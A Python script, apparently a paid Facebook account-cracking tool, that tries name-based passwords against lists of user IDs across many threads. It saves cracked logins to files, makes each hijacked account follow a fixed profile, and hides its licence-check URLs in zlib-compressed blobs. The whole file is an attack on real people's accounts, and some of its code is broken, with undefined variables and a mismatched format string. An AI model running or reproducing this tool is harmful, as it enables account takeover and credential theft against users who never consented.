#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
proxy = requests.get('https://raw.githubusercontent.com/ramzantanha/RamXan/main/tr.txt').text.splitlines()
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
              ###    ##     ## ########  
            ## ##    ##   ##  ##     ## 
          ##   ##    ## ##   ##     ## 
          ##     ##    ###    ########  
          #########   ## ##   ##     ## 
          ##     ##  ##   ##  ##     ## 
          ##     ## ##     ## ########  
=================================================
    [-] AUTHOR    :\033[1;32m AZAN CHAUDRY
    [-] GITHUB    :\033[1;32m MR-AZAN
    [-] WhatsApp  :\033[1;32m +923165456679
    [-] TOOLS     :\033[1;32m FILE CLONE
    [-] VERSION   :\033[1;32m 1.2
    [-] STATUS    :\033[1;32m PAID
================================================== """                               
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back SSB Menu ")
	    sarfraz()

def sarfraz():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Crack File ')
    print(' [w] Join Whatsapp Group ')
    print(' [f] Exit ')
    print('\033[1;97m===========================') 
    _sarfraz___ = input(' [\x1b[1;91m?\x1b[1;97m] Select Menu: ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        create_file()
    
    if _sarfraz___ in ('3', '03'):
        dupcutter()
    if _sarfraz___ in ('4', '04'):
    	pass
    if _sarfraz___ in ('4', '04'):
    	pass
    os.system("xdg-open https://chat.whatsapp.com/KrEOMUAyO2D83VfjhLHmi2 ")
class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AXB] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {"authority": 'web.facebook.com',
                    "method": 'GET',
                    "path": '/',
                    "scheme": 'https',
                    "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    "accept-encoding": 'gzip, deflate, br',
                    "accept-language": 'en-US,en;q=0.9',
                    "cache-control": 'max-age=0',
                    "cookie": 'datr=hWZ_Y7FDRH1BF2Re6P8U_0HZ;                    sb=hWZ_Y9YF7UnwDW2O2KmHPEJB; c_user=100011092841985; xs=24%3A6hyJzZBHRc2W1Q%3A2%3A1671772839%3A-1%3A6025; fr=0o33F1l1VPIOu5DzG.AWUTSGVE0KdfbFcLv5CMvmSWpRc.BjizHk.uB.AAA.0.0.BjpTqq.AWWYb5VO6gY; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1671772882294%2C%22v%22%3A1%7D; wd=433x563',
                    "referer": 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131',
                    "sec-ch-prefers-color-scheme": 'light',
                    "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                    "sec-ch-ua-mobile": '?0',
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": 'document',
                    "sec-fetch-mode": 'navigate',
                    "sec-fetch-site": 'same-origin',
                    "sec-fetch-user": '?1',
                    "upgrade-insecure-requests": '1',
                    "user-agent": 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                    "viewport-width": '433',}
                                
                header2 = {"authority": 'web.facebook.com',
                    "method": 'POST',
                    "path": '/ajax/bulk-route-definitions/',
                    "scheme": 'https',
                    "accept": '*/*',
                    "accept-encoding": 'gzip, deflate, br',
                    "accept-language": 'en-US,en;q=0.9',
                    "content-length": '2266',
                    "content-type": 'application/x-www-form-urlencoded',
                    "cookie": 'datr=hWZ_Y7FDRH1BF2Re6P8U_0HZ; sb=hWZ_Y9YF7UnwDW2O2KmHPEJB; c_user=100011092841985; xs=24%3A6hyJzZBHRc2W1Q%3A2%3A1671772839%3A-1%3A6025; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1671772882294%2C%22v%22%3A1%7D; wd=433x563; fr=0o33F1l1VPIOu5DzG.AWVXubvrHqm334dTBcrqceW8T6E.BjizHk.uB.AAA.0.0.BjpTrW.AWWLv5ICeV8',
                    "origin": 'https://web.facebook.com',
                    "referer": 'https://web.facebook.                   com/',
                    "sec-ch-prefers-color-scheme": 'light',
                    "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                    "sec-ch-ua-mobile": '?0',
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": 'empty',
                    "sec-fetch-mode": 'cors',
                    "sec-fetch-site": 'same-origin',
                    "user-agent": 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                    "viewport-width": '433',
                    "x-fb-lsd": 'dpfGTU_h6i7RZ9adHGot9-',}                        
                po = session.post(f"https://web.facebook.com/?_rdc=1&_rdr", data = das, headers = header1 , allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [SUCCESSFUL] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('smz_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [CHECKPOINT] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('S=A_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [CHECKPOINT] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('S=A_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;97m[1] \033[1;97m Crack With Only Name All Auto Pass \033[1;92m [V Fast] ')
        print('\033[1;97m[2] \033[1;97m Crack With Name digit Auto Pass \033[1;92m[fast]')
        print('\033[1;97m[3] \033[1;97m Crack With Mix Auto Pass \033[1;92m[Fast]')
        print('\033[1;97m[4] \033[1;97m Crack With Full Name digit Auto Pass \033[1;92m[Fast]')
        print('\033[1;97m[5] \033[1;97m Crack With Full Name digit Auto Pass \033[1;92m[Slow]')
        print('\033[1;97m[6] \033[1;97m Crack With Last Name Digit Auto Pass \033[1;92m[Slow]')
        print('\033[1;97m[7] \033[1;97m Crack With Mix Auto Pass \033[1;92m[V Slow]')
        print('\033[1;97m[8] \033[1;97m Crack With Name @ digit Auto Pass \033[1;92m[Normal]')
        print('\033[1;97m[9] \033[1;97m Crack With Choice Pass Name \033[1;92m[With Auto Pas]')
        print('\033[1;97m[10]  \033[1;97mCrack With Choice Pass Digit \033[1;92m[Your own pas]')
        print('\033[1;97m-----------------------------------------------')
        chi = input('\n [\x1b[1;91m?\x1b[1;97m] select pass: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('3', '03'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.title()
                        lasts = last.title()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx=[ps+' '+ps2,ps+ps2,first+' '+last,first+last]
                        else:
                            pwx=[ps+' '+ps2,ps+ps2,first+' '+last,first+last]
                           
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('4', '04'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0].lower()+xz[1].lower(),name.lower()]
                        else:
                            pwx = [name,xz[0].lower()+xz[1].lower(),name.lower()]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('5', '05'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1], xz[0]+xz[1]+"123", xz[0]+xz[1]+"12345"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[0]+xz[1]+"123", xz[0]+xz[1]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('6', '06'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[1]+"123", xz[1]+"12345",xz[1]+"1234", xz[1]+"786"]
                        else:
                            pwx = [xz[1]+"123", xz[1]+"12345",xz[1]+"1234", xz[1]+"786"]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('7', '07'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=60) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl]
                        else:
                            pwx = [firstl+' '+lastl]
                            pwx = [firstl+' '+lastl]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('8', '08'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('9', '09'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.title()
                        lasts = last.title()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+"123", first+"12345", first+"786"]
                        else:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+"123", first+"12345", first+"786"]
                     
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('10', '10'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=35) as ssbworld:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        elif len(xz) == 4:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                            pass
            os.remove(self.apk)
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
def bnsbuy():
    os.system('clear')
    print (logo)
    from urllib.parse import quote
    print('\tChecking For Subscription...\n')
    try:
        f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
        bd = (zlib.decompress(f))
        to = (open(bd, 'r').read())
    except (KeyError, IOError):
        bnsreg()
    try:
        bt = (b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5710\xd1\xf5\xcb/\xd1uw\r\xd1/\xd6\xcfM\xcc\xcc\xd3O\x04\x00&!\x13&')
        bw = (zlib.decompress(bt))
        r = (requests.get(bw).text)
    except requests.exceptions.ConnectionError:
        print ("\x1b[0;37mDATA CALLECTION ON KOR MADARCHUD........")
        exit()

    if to in r:
        fuck.append(1)
        kausar()
    else:
        os.system('clear')
        print (logo)
        print ('\x1b[1;97m\tYour Key Is Not Approved\n')
        print
        print
        print ('\r\x1b[1;97m Your Key : ' + to + '\n')
        print
        print('\rTool Price 350 Rs\n')
        print
        print('\Easy Paisa Account Number +923165456679\n')
        print('\Facebook Account Name ➣ Azan Ali\n')
        print
        print
        print('\rPayment Successfully Msg Or Key Send\n')
        print
        print
        sb = input('\rPaste Here Payment Successfully Msg:')
        print ('\n')
        ss = input('\rPaste Here your Key:')
        print('\n')
        print('\rYour Request Submitted Please wait  ')
        tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Key%20:%20'+ss
        os.system('am start https://wa.me/+923165456679?text=' + tks)

def bnsreg():
    os.system('clear')
    print (logo)
    print ('\x1b[1;97m\tYour Key Is Not Approved\n')
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~Mr.K4US4R=="
    print
    print ('\n\x1b[1;97m Your Key: \x1b[97m' + id + '\n')
    print
    print('\rTool Price 100Rs\n')
    print
    print('\Easy Paisa Account Number +923165456679\n')
    print('\rAccount Name ➣ Azan Ali\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
    sb = input('\rPaste Here Payment Successfully Msg:')
    print ('\n')
    ss = input('\rPaste Here your Key:')
    print ('\n')
    print('Your Request Submitted Please wait  ')
    tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Key%20:%20'+ss
    os.system('am start https://wa.me/+923165456679?text=' + tks)
    f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
    bd = (zlib.decompress(f))
    sav = open(bd, 'w') 
    sav.write(id)
    sav.close()
    os.system("clear")
    time.sleep(3)
    exit()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

sarfraz()

